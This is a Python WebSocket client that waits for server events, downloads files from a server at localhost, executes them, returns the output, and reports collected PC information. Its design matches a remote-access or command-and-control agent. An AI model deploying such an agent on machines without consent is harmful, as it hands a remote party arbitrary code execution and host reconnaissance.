import requests
import websocket
import os
import json
from core import *


SERVER_URL = "http://localhost:3000"
FILE_URL = SERVER_URL + "/api/files/"
FILE_OUTPUT_URL = SERVER_URL + "/api/results"
PC_INFO_URL = SERVER_URL+ "/api/pc_info"


def fetch_file(filename):
    """Fetches the Python file from the server and saves it locally."""
    response = requests.get(FILE_URL + filename)
    
    if response.status_code == 200:
        with open(filename, 'w') as file:
            file.write(response.text)
        print(f"File '{filename}' fetched and saved.")
        return filename
    else:
        print(f"Failed to fetch file: {response.status_code}")
        return None


def send_file_output(data):
    """Sends the execution results back to the server."""
    response = requests.post(FILE_OUTPUT_URL, json={"file_output": data})
    if response.status_code == 200:
        print("File output sent successfully.")
    else:
        print(f"Failed to send file output: {response.status_code}")


def send_pc_info(data):
    """Sends the computer information to the server."""
    response = requests.post(PC_INFO_URL, json={"pc_info": data})
    if response.status_code == 200:
        print("PC info sent successfully.")
    else:
        print(f"Failed to send PC info: {response.status_code}")


def on_new_file_event(data):
    filename = data['filename']
    if filename:
        file_name = fetch_file(filename)
        if file_name:
            execution_results = execute_file(file_name)
            if execution_results:
                send_file_output(execution_results)
            os.remove(file_name)

def on_pc_info_event():
    pc_info = get_pc_info()
    send_pc_info(pc_info)

def on_message(ws, message):
    """Handles messages received from the server."""
    print(f"Received message from server: {message}")
    data = json.loads(message)
    if data['event'] == "new_file":
        on_new_file_event(data)
    elif data['event'] == "pc_info":
        on_pc_info_event()
    else:
        print("An unhandled event occurred.")

def on_error(ws, error):
    """Handles WebSocket errors."""
    print(f"Error: {error}")

def on_close(ws, close_status_code, close_msg):
    """Handles WebSocket disconnection and attempts to reconnect."""
    print("### WebSocket connection closed ###")

def on_open(ws):
    """Handles WebSocket connection establishment."""
    print("### WebSocket connection established ###")

def connect():
    """Initiates a WebSocket connection and runs it indefinitely."""
    ws = websocket.WebSocketApp(
        "ws://localhost:3000",
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close
    )
    ws.run_forever()
